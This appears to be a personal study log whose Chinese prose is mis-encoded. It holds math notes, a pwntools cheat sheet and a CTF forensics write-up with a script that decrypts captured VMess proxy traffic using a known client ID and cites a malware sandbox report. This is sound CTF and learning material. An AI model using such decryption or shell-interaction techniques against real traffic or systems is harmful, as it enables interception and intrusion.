<p><em>æˆ‘å¾ˆæ»¡æ„ï¼Œç”šè‡³æƒ³æŠŠpycharmä¹Ÿç»™æ¢äº†ï¼Œç”¨vscodeè¿è¡Œpythonä»£ç ã€‚ä¸è¿‡å…ˆç»§ç»­å°è¯•å§ï¼Œæ‰¾åˆ°åˆé€‚çš„ä½¿ç”¨æ–¹æ³•ã€‚</em></p>
<h1 id="230412"><a href="#230412" class="headerlink" title="230412"></a>230412</h1><h2 id="ä¸€äº›æ•°å­¦æ¦‚å¿µ"><a href="#ä¸€äº›æ•°å­¦æ¦‚å¿µ" class="headerlink" title="ä¸€äº›æ•°å­¦æ¦‚å¿µ"></a>ä¸€äº›æ•°å­¦æ¦‚å¿µ</h2><h3 id="å¹³å‡¡"><a href="#å¹³å‡¡" class="headerlink" title="å¹³å‡¡"></a>å¹³å‡¡</h3><p>å¹³å‡¡å°±æ˜¯æŒ‡æœ€ç®€å•çš„æƒ…å½¢ï¼Œæˆ–è€…è¯´æ˜¯å®¹æ˜“è¯æ˜çš„ã€å®¹æ˜“çœ‹åˆ°çš„ã€‚</p>
<h3 id="éå¹³å‡¡"><a href="#éå¹³å‡¡" class="headerlink" title="éå¹³å‡¡"></a>éå¹³å‡¡</h3><p>éé›¶è§£ï¼Ÿ</p>
<h3 id="é€€åŒ–"><a href="#é€€åŒ–" class="headerlink" title="é€€åŒ–"></a>é€€åŒ–</h3><p>â€œé€€åŒ–â€çš„è¯ï¼Œåœ¨æ•°å­¦é‡Œé¢æœ‰â€œä¸å¯é€†â€ã€â€œä¸æ»¡ç§©â€è¿™æ ·çš„å«ä¹‰ã€‚å®ƒä¸€èˆ¬è·Ÿâ€œæŸä¸ªé‡ç­‰äº0â€æœ‰å…³ã€‚</p>
<h2 id="pwntoolsçš„ä½¿ç”¨"><a href="#pwntoolsçš„ä½¿ç”¨" class="headerlink" title="pwntoolsçš„ä½¿ç”¨"></a>pwntoolsçš„ä½¿ç”¨</h2><h3 id="contextæ¨¡å—ä½¿ç”¨"><a href="#contextæ¨¡å—ä½¿ç”¨" class="headerlink" title="contextæ¨¡å—ä½¿ç”¨"></a>contextæ¨¡å—ä½¿ç”¨</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">context.clear()	        ## æ¸…é™¤å½“å‰è¿è¡Œæ—¶å˜é‡</span><br><span class="line">context.arch = â€˜armâ€™	## è®¾ç½®æ¶æ„ï¼šamd64ã€i386ã€armã€mips</span><br><span class="line">context.os = â€˜linuxâ€™	## è®¾ç½®æ“ä½œç³»ç»Ÿï¼šlinux</span><br><span class="line">context.bits=â€˜32â€™	    ## è®¾ç½® 32 ä½æˆ– 64 ä½ï¼š32ã€64</span><br><span class="line">context.endian=â€˜littleâ€™	## è®¾ç½®å­—èŠ‚åºï¼šlittleã€big</span><br><span class="line">context.update(os=â€˜linuxâ€™, arch=â€˜amd64â€™, bits=64) ## æ›´æ–°å½“å‰è¿è¡Œæ—¶å˜é‡</span><br><span class="line">context.log_level=â€˜debugâ€™	                      ## è®¾ç½®æ—¥å¿—çº§åˆ«ï¼šdebugã€info</span><br><span class="line">context.log_file=â€˜/tmp/pwnlog.txtâ€™	              ## è®¾ç½®æ—¥å¿—ä¿å­˜æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<h3 id="tubeæ¨¡å—ä½¿ç”¨"><a href="#tubeæ¨¡å—ä½¿ç”¨" class="headerlink" title="tubeæ¨¡å—ä½¿ç”¨"></a>tubeæ¨¡å—ä½¿ç”¨</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- å¸¸ç”¨å‘½ä»¤</span><br><span class="line">## è¿æ¥</span><br><span class="line">  remote(&#x27;ip&#x27;,ç«¯å£)ï¼šè¿œç¨‹</span><br><span class="line">  process()ï¼šæœ¬åœ°</span><br><span class="line">## å‘é€</span><br><span class="line">  send(data) : å‘é€æ•°æ®</span><br><span class="line">  sendline(data) : å‘é€ä¸€è¡Œæ•°æ®ï¼Œç›¸å½“äºåœ¨æ•°æ®æœ«å°¾åŠ \n</span><br><span class="line">  sendafter(xxx,data)ï¼šæ¥æ”¶åˆ° xxx ä¹‹åå‘é€ data</span><br><span class="line">## æ¥æ”¶</span><br><span class="line">  recv(numb=4096, timeout=default) : æ¥æ”¶æŒ‡å®šå­—èŠ‚</span><br><span class="line">  recvline(keepends=True) : æ¥æ”¶ä¸€è¡Œï¼Œkeependsä¸ºæ˜¯å¦ä¿ç•™è¡Œå°¾çš„\n</span><br><span class="line">  recvuntil(delims, drop=False) : ä¸€ç›´è¯»åˆ° delims çš„ pattern å‡ºç°ä¸ºæ­¢</span><br><span class="line">  recvrepeat(timeout=default) : æŒç»­æ¥å—ç›´åˆ°EOFæˆ–timeout</span><br><span class="line">## äº¤äº’</span><br><span class="line">  interactive()  ç›´æ¥è¿›è¡Œäº¤äº’ï¼Œç›¸å½“äºå›åˆ°shellçš„æ¨¡å¼ï¼Œåœ¨å–å¾—shellä¹‹åä½¿ç”¨</span><br></pre></td></tr></table></figure>

<h3 id="æ¨¡å—ä¸­å…¶ä»–å‡½æ•°"><a href="#æ¨¡å—ä¸­å…¶ä»–å‡½æ•°" class="headerlink" title="æ¨¡å—ä¸­å…¶ä»–å‡½æ•°"></a>æ¨¡å—ä¸­å…¶ä»–å‡½æ•°</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interactive()	  ## äº¤äº’æ¨¡å¼ï¼Œèƒ½å¤ŸåŒæ—¶è¯»å†™ç®¡é“ï¼Œé€šå¸¸åœ¨è·å¾— shell ä¹‹åè°ƒç”¨</span><br><span class="line">recv(numb=1096, timeout=default)  ## æ¥å—æœ€å¤š numb å­—èŠ‚çš„æ•°æ®</span><br><span class="line">recvn(numb, timeout=default)	  ## æ¥å— numb å­—èŠ‚çš„æ•°æ®</span><br><span class="line">recvall()	                      ## æ¥å—æ•°æ®ç›´åˆ° EOF</span><br><span class="line">recvline(keepends=True)	          ## æ¥å—ä¸€è¡Œï¼Œå¯é€‰æ‹©æ˜¯å¦ä¿ç•™è¡Œå°¾çš„ â€˜\nâ€™</span><br><span class="line">recvrepeat(timeout=default)	      ## æ¥å—æ•°æ®ç›´åˆ° EOF æˆ– timeout</span><br><span class="line">recvuntil(delims,timeout=default) ## æ¥å—æ•°æ®ç›´åˆ° delims å‡ºç°</span><br><span class="line">send(data)	      ## å‘é€æ•°æ®</span><br><span class="line">sendafter(delim, data, timeout=default)	 ## ç›¸å½“äº recvuntil(delim, timeout) å’Œ send(data) çš„ç»„åˆ</span><br><span class="line">sendline(data)	  ## å‘é€ä¸€è¡Œï¼Œé»˜è®¤åœ¨è¡Œå°¾åŠ  â€œ\nâ€</span><br><span class="line">sendlineafter(delim, data, timeout=default)	## ç›¸å½“äº recvuntil(delim, timeout) å’Œ sendline(data) çš„ç»„åˆ</span><br><span class="line">close()	          ## å…³é—­ç®¡é“</span><br></pre></td></tr></table></figure>

<h1 id="230413"><a href="#230413" class="headerlink" title="230413"></a>230413</h1><p>è¯»è®ºæ–‡ã€‚</p>
<h2 id="ä¸€ç‚¹ç–‘é—®"><a href="#ä¸€ç‚¹ç–‘é—®" class="headerlink" title="ä¸€ç‚¹ç–‘é—®"></a>ä¸€ç‚¹ç–‘é—®</h2><blockquote>
<p>p % (q - 1) &#x3D;&#x3D;? p - q + 1 </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">assert p &gt; q</span><br><span class="line">test1 = p % (q-1)</span><br><span class="line">test2 = p - q + 1</span><br><span class="line">print(test1)</span><br><span class="line">print(test2)</span><br></pre></td></tr></table></figure>

<p><em>ä¸å¤ªç†è§£ã€‚</em></p>
<h1 id="230417"><a href="#230417" class="headerlink" title="230417"></a>230417</h1><h2 id="Lattice"><a href="#Lattice" class="headerlink" title="Lattice"></a>Lattice</h2><ul>
<li>å®šä¹‰æ ¼ç©ºé—´ï¼Œé€šå¸¸æƒ…å†µä¸‹$\mathbb{Z}^{n}$ï¼Œæ•°å­¦å®šä¹‰ä¸‹æ˜¯$\mod n$ï¼Œ<strong>å…³é”®</strong>åŸºå‘é‡ï¼Œä¸”å¯å˜ã€‚<ul>
<li><em>åˆå§‹å‘é‡æ˜¯åŸºå‘é‡çš„å®šä¹‰æºï¼Ÿ</em></li>
</ul>
</li>
<li><em>å¤šé¡¹å¼æ—¶é—´ï¼Ÿ</em></li>
<li>è¦†ç›–åŠå¾„ï¼Œæ— ç©·å¤§æ—¶å­˜åœ¨é«˜æ–¯åˆ†å¸ƒ-è°ƒå’Œåˆ†æ</li>
<li>ä¸Šä¸‹ç•Œ<ul>
<li>å‡¸ä½“ç†è®º</li>
</ul>
</li>
</ul>
<h2 id="çº¿æ€§ç›¸å…³-x2F-çº¿æ€§æ— å…³æ€§è´¨"><a href="#çº¿æ€§ç›¸å…³-x2F-çº¿æ€§æ— å…³æ€§è´¨" class="headerlink" title="çº¿æ€§ç›¸å…³&#x2F;çº¿æ€§æ— å…³æ€§è´¨"></a>çº¿æ€§ç›¸å…³&#x2F;çº¿æ€§æ— å…³æ€§è´¨</h2><img src="/2023/12/31/WeeklyStudy/image-20230417134326666.png" class="" title="image-20230417134326666">

<h1 id="230419"><a href="#230419" class="headerlink" title="230419"></a>230419</h1><h2 id="è°å½±é‡é‡"><a href="#è°å½±é‡é‡" class="headerlink" title="è°å½±é‡é‡"></a>è°å½±é‡é‡</h2><p>é¢˜ç›®æ˜¯ä¸€å¼€å§‹å°±ä¸Šçº¿äº†çš„ï¼Œæ‰€ä»¥å½“æ—¶çœ‹åˆ°é‚£ä»½ <code>config.json</code> å°±çŒœåˆ°äº†è¿™æ˜¯è¦åš vmess çš„æµé‡è§£æï¼Œäºæ˜¯ç¿»å‡ºæ¥äº†ä¸‡æ¶çš„ vmess æ–‡æ¡£ï¼Œä¾ç…§æ–‡æ¡£å¼€å§‹å†™è§£æè„šæœ¬ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230420103327152.png" class="" title="image-20230420103327152">

<p><code>req</code>çš„ç›¸å…³æ•°æ®åœ¨è¿™ä¸€æµå½“ä¸­æ˜¾ç¤ºã€‚</p>
<p>è®¤è¯äº¤äº’çš„æ•°æ®åœ¨<code>Data</code>éƒ¨åˆ†ï¼Œç›´æ¥å¤åˆ¶å®ƒçš„å€¼å³å¯ã€‚</p>
<p>å‰16å­—èŠ‚æ˜¯è®¤è¯å“ˆå¸Œå€¼ã€‚<em>åé¢çš„æ•°æ®åº”è¯¥å°±æ˜¯å®é™…æ•°æ®ï¼Ÿ</em></p>
<p>æ—¶é—´<code>Mar 12, 2021 14:02:42.667325408 ä¸­å›½æ ‡å‡†æ—¶é—´</code></p>
<p>æ—¶é—´æˆ³<code>1615528962.667325408</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230420105644289.png" class="" title="image-20230420105644289">

<p>åˆ©ç”¨æ•°æ®åŒ…ä¸­çš„æ—¶é—´è½¬æ¢æ—¶é—´æˆ³ã€‚</p>
<p>HMACå¿…é¡»æŒ‰ç…§ç‰¹å®šé¡ºåºè¾“å…¥éœ€è¦çš„æ•°å€¼æ‰å¯ä»¥ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230420112127745.png" class="" title="image-20230420112127745">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vmess_hmac = <span class="keyword">lambda</span> x: hmac.new(client_id, x, hashlib.md5).hexdigest()</span><br></pre></td></tr></table></figure>



<p>p(64)ä¸€ç›´æ²¡åŠæ³•è°ƒç”¨ï¼Œä»”ç»†æ€è€ƒåº”è¯¥æ˜¯åº“åå†²çªäº†ã€‚<code>pwntools</code>çš„è°ƒç”¨æ˜¯<code>from pwn import *</code>ï¼Œ è€Œä¹‹å‰åˆå®‰è£…äº†ä¸çŸ¥åçš„<code>pwn</code>åº“ï¼Œæ‰€ä»¥å¯¼è‡´è°ƒç”¨å†²çªå§ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230421135041930.png" class="" title="image-20230421135041930">

<p>å®˜æ–¹æ–‡æ¡£æ²¡æ›´æ–°ï¼Œçœ‹æºç 3åº”è¯¥æ˜¯<code>AES-128-GCM</code></p>
<h2 id="vmessåè®®"><a href="#vmessåè®®" class="headerlink" title="vmessåè®®"></a>vmessåè®®</h2><blockquote>
<p><a href="https://www.bookstack.cn/read/V2RAY/developer-protocols-vmess.md">åè®®ç»†èŠ‚ - VMess åè®® - ã€ŠProject Vï¼ˆV2RAYï¼‰æ–‡æ¡£æ‰‹å†Œã€‹ - ä¹¦æ ˆç½‘ Â· BookStack</a></p>
</blockquote>
<h3 id="æŒ‡ä»¤éƒ¨åˆ†"><a href="#æŒ‡ä»¤éƒ¨åˆ†" class="headerlink" title="æŒ‡ä»¤éƒ¨åˆ†"></a>æŒ‡ä»¤éƒ¨åˆ†</h3><p>æŒ‡ä»¤éƒ¨åˆ†ç»è¿‡ AES-128-CFB åŠ å¯†ï¼š</p>
<ul>
<li>Keyï¼šMD5(ç”¨æˆ· ID + []byte(â€˜c48619fe-8f02-49e0-b9e9-edf763e17e21â€™))</li>
<li>IVï¼šMD5(X + X + X + X)ï¼ŒX &#x3D; []byte(è®¤è¯ä¿¡æ¯ç”Ÿæˆçš„æ—¶é—´) (8 å­—èŠ‚, Big Endian)</li>
</ul>
<h2 id="æ›´æ–°pycharmä¸­çš„ç¬¬ä¸‰æ–¹åº“"><a href="#æ›´æ–°pycharmä¸­çš„ç¬¬ä¸‰æ–¹åº“" class="headerlink" title="æ›´æ–°pycharmä¸­çš„ç¬¬ä¸‰æ–¹åº“"></a>æ›´æ–°pycharmä¸­çš„ç¬¬ä¸‰æ–¹åº“</h2><p>å³è¾¹å‡ºç°å°–è§’è¯´æ˜å¯ä»¥æ›´æ–°ï¼Œç›´æ¥ç‚¹å‡»è¿›è¡Œç›¸å…³ç•Œé¢ï¼Œç„¶åå‹¾é€‰å®‰è£…ç‰¹å®šç‰ˆæœ¬å³å¯å®‰è£…åˆ°æ–°ç‰ˆã€‚</p>
<p>å¦‚æœæœ€æ–°ç‰ˆæœ¬æ˜¯æµ‹è¯•ç‰ˆæœ¬çš„è¯ï¼Œå¯ä»¥é€‰å…¶ä»–ç‰ˆæœ¬ã€‚</p>
<h2 id="AES-128-GCM"><a href="#AES-128-GCM" class="headerlink" title="AES-128-GCM"></a>AES-128-GCM</h2><p>GCMï¼ˆ Galois&#x2F;Counter Mode )<br>GCMä¸­çš„Gå°±æ˜¯æŒ‡GMACï¼ŒCå°±æ˜¯æŒ‡CTRã€‚<br>GCMå¯ä»¥æä¾›å¯¹æ¶ˆæ¯çš„åŠ å¯†å’Œå®Œæ•´æ€§æ ¡éªŒï¼Œå¦å¤–ï¼Œå®ƒè¿˜å¯ä»¥æä¾›é™„åŠ æ¶ˆæ¯çš„å®Œæ•´æ€§æ ¡éªŒã€‚åœ¨å®é™…åº”ç”¨åœºæ™¯ä¸­ï¼Œæœ‰äº›ä¿¡æ¯æ˜¯æˆ‘ä»¬ä¸éœ€è¦ä¿å¯†ï¼Œä½†ä¿¡æ¯çš„æ¥æ”¶è€…éœ€è¦ç¡®è®¤å®ƒçš„çœŸå®æ€§çš„ï¼Œä¾‹å¦‚æºIPï¼Œæºç«¯å£ï¼Œç›®çš„IPï¼ŒIVï¼Œç­‰ç­‰ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸€éƒ¨åˆ†ä½œä¸ºé™„åŠ æ¶ˆæ¯åŠ å…¥åˆ°MACå€¼çš„è®¡ç®—å½“ä¸­ã€‚ä¸‹å›¾çš„Ekè¡¨ç¤ºç”¨å¯¹ç§°ç§˜é’¥kå¯¹è¾“å…¥åšAESè¿ç®—ã€‚æœ€åï¼Œå¯†æ–‡æ¥æ”¶è€…ä¼šæ”¶åˆ°å¯†æ–‡ã€<strong>IVï¼ˆè®¡æ•°å™¨CTRçš„åˆå§‹å€¼ï¼‰</strong>ã€MACå€¼ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/Center.png" class="" title="img">

<h1 id="230421"><a href="#230421" class="headerlink" title="230421"></a>230421</h1><h2 id="ç»§ç»­æ•´æ´»è°å½±é‡é‡"><a href="#ç»§ç»­æ•´æ´»è°å½±é‡é‡" class="headerlink" title="ç»§ç»­æ•´æ´»è°å½±é‡é‡"></a>ç»§ç»­æ•´æ´»è°å½±é‡é‡</h2><blockquote>
<p><a href="https://any.run/report/0d7aa23a72d22dcf47f8723c58d101b3b113cbc79dd407a6fac0e65d67076ea1/2211f4a0-81e4-432d-87a8-c7c285a5a919">Malware analysis extracted_at_0x22a7b.exe Malicious activity | ANY.RUN - Malware Sandbox Online</a></p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230421105016271.png" class="" title="image-20230421105016271">

<p>9æœˆ26æ—¥ï¼ŒProofpointç ”ç©¶äººå‘˜å‘ç°ä¸€èµ·é’ˆå¯¹ç¾å›½æ¥æ”¶è€…çš„ä¸Šä¸‡çš„åƒåœ¾é‚®ä»¶æ”»å‡»æ´»åŠ¨ã€‚é‚®ä»¶ä½¿ç”¨eFaxè¯±é¥µæ–‡ä»¶ï¼ˆå›¾1ï¼‰å’ŒURLé“¾æ¥æ¥ä¸‹è½½å«æœ‰æ¶æ„å®çš„æ–‡æ¡£ï¼ˆå›¾2ï¼‰ã€‚å¦‚æœç”¨æˆ·å¯ç”¨äº†å®ï¼Œå®æ–‡ä»¶å°±ä¼šæ‰§è¡ŒåµŒå…¥çš„Hancitoræ¶æ„è½¯ä»¶ï¼Œæ¶æ„è½¯ä»¶æ‰§è¡Œåä¼šæ¥æ”¶ä»»åŠ¡æ¥ä¸‹è½½ä¸¤ä¸ªç‰ˆæœ¬çš„Ponyçªƒå–å™¨å’ŒDanaBoté“¶è¡Œæœ¨é©¬ã€‚</p>
<ul>
<li>ç—…æ¯’åˆ†æ</li>
</ul>
<blockquote>
<p><a href="https://any.run/report/0d7aa23a72d22dcf47f8723c58d101b3b113cbc79dd407a6fac0e65d67076ea1/2211f4a0-81e4-432d-87a8-c7c285a5a919">Malware analysis extracted_at_0x22a7b.exe Malicious activity | ANY.RUN - Malware Sandbox Online</a></p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230421150620900.png" class="" title="image-20230421150620900">

<p>å¾—åˆ°<code>url = http://api.ipify.org</code></p>
<p>é¢˜ç›®ä¸­æ‰€ç»™çš„å‹ç¼©åŒ…ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230421150853675.png" class="" title="image-20230421150853675">

<p>æ ¹æ®æç¤ºmd5ä¸€ä¸‹ï¼Œå¾—åˆ°<code>08229f4052dde89671134f1784bed2d6</code></p>
<p>å¾—åˆ°çš„æ–‡ä»¶ä½¿ç”¨<code>WINHEX</code>æ‰“å¼€ä¸€ä¸‹ï¼Œå‘ç°æç¤ºäº†æ–‡ä»¶ç±»å‹ï¼Œæ˜¯<code>Gob</code>æ–‡ä»¶</p>
<img src="/2023/12/31/WeeklyStudy/image-20230421151511429.png" class="" title="image-20230421151511429">

<p>åˆ©ç”¨å±æ€§æ¥è¿›è¡Œå®šä¹‰ï¼Œä»è€Œååºåˆ—åŒ–ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230421152349138.png" class="" title="image-20230421152349138">



<p>å¯¼åŒ…çš„æ—¶å€™å‡ºç°äº†<code>missing path</code>ï¼Œæ‰¾äº†æŠ¥é”™åŸå› ï¼Œæ²¡è§£å†³ï¼Œåæ¥å‘ç°æ˜¯å› ä¸ºæ ¼å¼é”™äº†ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><em>æå‡ºä¸€å¼ å›¾ç‰‡äº†ï¼Œä½†æ²¡æ˜ç™½ä¸ºå•¥å›¾ç‰‡çš„å¤§å°å°±æ˜¯<code>70450bytes</code>ï¼Œæœ‰ç‚¹è¿·æƒ‘ã€‚</em></p>
<img src="/2023/12/31/WeeklyStudy/image-20230421155213728.png" class="" title="image-20230421155213728">

<p>æ²¡æ‰¾åˆ°åˆé€‚çš„å·¥å…·æå–éšå†™ï¼Œåæœ‰å…«ä¹æ˜¯æå–åƒç´ ç‚¹çš„ã€‚</p>
<h3 id="æœ€ç»ˆexp"><a href="#æœ€ç»ˆexp" class="headerlink" title="æœ€ç»ˆexp"></a>æœ€ç»ˆexp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@Author  :Eurynome</span></span><br><span class="line"><span class="string">@Date    :2023/4/19 17:19</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">config.json</span></span><br><span class="line"><span class="string">&quot;settings&quot;: &#123;</span></span><br><span class="line"><span class="string">                &quot;clients&quot;: [</span></span><br><span class="line"><span class="string">                    &#123;</span></span><br><span class="line"><span class="string">                        &quot;id&quot;: &quot;b831381d-6324-4d53-ad4f-8cda48b30811&quot;</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                ]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1111</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">client_id = uuid.UUID(<span class="string">&#x27;b831381d-6324-4d53-ad4f-8cda48b30811&#x27;</span>).<span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line">md5 = <span class="keyword">lambda</span> x: hashlib.md5(x).hexdigest()</span><br><span class="line">vmess_hmac = <span class="keyword">lambda</span> x: hmac.new(client_id, x, hashlib.md5).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">4dd11f9b04f2b562b9db539d939f1d52 b48b35bf592c09b21545392f73f6cef91143786464578c1c361aa72f638cd0135f25343555f509aef6c74cd2a2b86ee0a9eb3b93a81a541def4763cc54f91ba02681add1b815e8c50e028c76bde0ee8a9593db88d901066305a51a9586a9e377ee100e7d4d33fcfc0453c86b1998a95275cd9368a68820c2a6a540b6386c146ea7579cfe87b2e459856772efdcf0e4c6ab0f11d018a15561cf409cbc00491d7f4d22b7c486a76a5f2f25fbef503551a0aeb90ad9dd246a9cc5e0d0c0b751eb7b54b0abbfef198b1c4e5e755077469c318f20f3e418af03540811ab5c1ea780c886ea2c903b458a26</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">req = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;4dd11f9b04f2b562b9db539d939f1d52&#x27;</span> + <span class="string">&#x27;b48b35bf592c09b21545392f73f6cef91143786464578c1c361aa72f638cd0135f25343555f509aef6c74cd2a2b86ee0a9eb3b93a81a541def4763cc54f91ba02681add1b815e8c50e028c76bde0ee8a9593db88d901066305a51a9586a9e377ee100e7d4d33fcfc0453c86b1998a95275cd9368a68820c2a6a540b6386c146ea7579cfe87b2e459856772efdcf0e4c6ab0f11d018a15561cf409cbc00491d7f4d22b7c486a76a5f2f25fbef503551a0aeb90ad9dd246a9cc5e0d0c0b751eb7b54b0abbfef198b1c4e5e755077469c318f20f3e418af03540811ab5c1ea780c886ea2c903b458a26&#x27;</span>)</span><br><span class="line"><span class="comment"># print(req)</span></span><br><span class="line">cut_time = <span class="number">1615528962</span></span><br><span class="line">target_hash = req[:<span class="number">16</span>].<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(target_hash)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cmd_iv</span>(<span class="params">time, target_hash</span>):</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(time - <span class="number">50</span>, time + <span class="number">50</span>):</span><br><span class="line">        cur_hash = vmess_hmac(p64(t))</span><br><span class="line">        <span class="comment"># print(t)</span></span><br><span class="line">        <span class="comment"># print(cur_hash)</span></span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">1615528982</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;time     = <span class="subst">&#123;t&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> md5(p64(t, endian=<span class="string">&#x27;big&#x27;</span>) * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">cmd_key = md5(client_id + <span class="string">b&#x27;c48619fe-8f02-49e0-b9e9-edf763e17e21&#x27;</span>)</span><br><span class="line">cmd_iv = get_cmd_iv(cut_time, target_hash)</span><br><span class="line"><span class="comment"># print(type(cmd_iv))</span></span><br><span class="line"><span class="comment"># print(type(cmd_key))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd_key  = <span class="subst">&#123;cmd_key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd_iv   = <span class="subst">&#123;cmd_iv&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># time     = 1615528982</span></span><br><span class="line"><span class="comment"># cmd_key  = &quot;b50d916ac0cec067981af8e5f38a758f&quot;</span></span><br><span class="line"><span class="comment"># cmd_iv   = &quot;881eb47d4d3b67b24328c5178c0eedcc&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">2222</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> fnvhash <span class="keyword">import</span> fnv1a_32</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">cmd_aes = <span class="keyword">lambda</span>: AES.new(<span class="built_in">bytes</span>.fromhex(cmd_key), AES.MODE_CFB, <span class="built_in">bytes</span>.fromhex(cmd_iv), segment_size=<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">cmd = req[<span class="number">16</span>:]</span><br><span class="line">ret = cmd_aes().decrypt(cmd)</span><br><span class="line"><span class="comment"># ret = bytes.fromhex(&#x27;0113277f5732da52ada790d87b8829daa95e4a9aa9ba58c7e3ad36fe2499dca259a20d6300011388017f0000011ace7d9bb0b539182c0381aa405d112d5d1dc1d33ec58e446b151f3331cd5209d25d1b065fa8754486e571584c46fa7d0ee443eb69abf466c28349e9020923cc8f472f1d20bbe05687b720e2cc8fab4dc173c232d6c815cb7c75c6bd74d2e2a57638effd11ff009c36384c431b123ed124965e218a79cfb91155fc55b81faf716aefb58328f295e76e352d11e90317ae8d209038ae70d19ee2f577c4841d77dc426431088a943244f50af3a2ffdf45b8ff210b2c4ff551076127fa&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ver      = <span class="subst">&#123;ret[<span class="number">0</span>:<span class="number">1</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;dat_iv   = <span class="subst">&#123;ret[<span class="number">1</span>:<span class="number">17</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;dat_key  = <span class="subst">&#123;ret[<span class="number">17</span>:<span class="number">33</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v        = <span class="subst">&#123;ret[<span class="number">33</span>:<span class="number">34</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;opt      = <span class="subst">&#123;ret[<span class="number">34</span>]:b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p        = <span class="subst">&#123;ret[<span class="number">35</span>:<span class="number">36</span>].<span class="built_in">hex</span>()[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;sec      = <span class="subst">&#123;ret[<span class="number">35</span>:<span class="number">36</span>].<span class="built_in">hex</span>()[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">p = <span class="built_in">int</span>(ret[<span class="number">35</span>:<span class="number">36</span>].<span class="built_in">hex</span>()[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd      = <span class="subst">&#123;ret[<span class="number">37</span>:<span class="number">38</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;port     = <span class="subst">&#123;bytes_to_long(ret[<span class="number">38</span>:<span class="number">40</span>])&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span 